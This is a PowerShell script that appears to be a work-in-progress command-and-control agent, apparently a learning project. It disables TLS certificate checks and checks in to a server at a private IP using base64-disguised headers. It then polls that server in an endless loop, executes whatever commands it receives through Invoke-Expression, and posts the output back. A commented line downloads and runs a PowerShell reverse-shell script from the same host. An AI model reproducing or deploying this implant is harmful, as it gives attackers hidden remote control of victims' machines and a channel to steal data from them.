function ConvertTo-HashtableFromPsCustomObject { 
    param ( 
        [Parameter(  
            Position = 0,   
            Mandatory = $true,   
            ValueFromPipeline = $true,  
            ValueFromPipelineByPropertyName = $true  
        )] [object] $psCustomObject 
    );
    Write-Verbose "[Start]:: ConvertTo-HashtableFromPsCustomObject"

    $output = @{}; 
    $psCustomObject | Get-Member -MemberType *Property | % {
        $output.($_.name) = $psCustomObject.($_.name); 
    } 
    
    Write-Verbose "[Exit]:: ConvertTo-HashtableFromPsCustomObject"

    return  $output;
}


add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3, [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12

$complete = @("")
$pending = @("")
$json_format = @{
    agent_id='joe'
    ip='doe'
    os='windows'
    user='guest'
    pending_commands=@()
    completed_commands=@()


}

$headerz = @{
    "User-Agent"     ="QmxhY2tUYWJieQo="
    "Agent"          ='TGVhcm5pbmdDVG9CRWxpdGUK'
}

$json_doc = $json_format | ConvertTo-Json
$response = Invoke-RestMethod "https://10.0.0.150:9000/first_check_in" -Method Post -Body $json_doc -Headers $headerz -ContentType 'application/json'
$doc_id = $response.id
$refresh_token = $response.refresh
$access_token = $response.token
<## end first_check_in function #>


$poll_headers = @{}
$poll_headers.Add('doc_id',$doc_id)
$poll_headers.Add('Authorization',"Bearer $access_token")

$complete_commands =@{}

while ($true){
$polling_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Get -Headers $poll_headers -ContentType 'application/json'
echo $polling_resp | ConvertTo-Json

$post_body = ConvertTo-HashtableFromPsCustomObject($polling_resp)
$post_body

  if ($polling_resp.pending_commands) {
    echo "found something"
    foreach ($command in $polling_resp.pending_commands){

    if ($command.StartsWith('"')){
    echo "starts with doubleqoute"
    $comm_result = iex "& $command" | format-list
    $complete_commands.Add($command,$comm_result) 
    #$json_format.completed_commands += $complete_commands
    #$post_body.completed_commands += @($command)
    #$post_body.completed_commands += @($comm_result)
    $post_body.completed_commands += @{$command=$comm_result}
    }
    else{
    $comm_result = iex $command
    $complete_commands.Add($command,$comm_result)
    #$json_format.completed_commands += $complete_commands
    $post_body.completed_commands += @{$command=$comm_result}
    #$post_body.completed_commands += @($comm_result)
    }
  }
    $post_body.pending_commands = @()
    $json_post = $post_body | ConvertTo-Json
    $post_resp = Invoke-RestMethod "https://10.0.0.150:9000/poll" -Method Post -Body $json_post -Headers $poll_headers -ContentType 'application/json'
    echo "POST SUCCESS"

}
  else {
    echo "no command"
    # call refresh to get new token
  }

  sleep(10)

  }

  #IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.150/Invoke-PowerShellTcp.ps1')
  #echo "while loop ended"
  #echo $json_format.completed_commands
  echo $post_body | ConvertTo-Json
  #echo $poll_headers
  #echo $polling_resp | ConvertTo-Json
  
  ## so far command execution works
  ## just need to post results and keep running loop


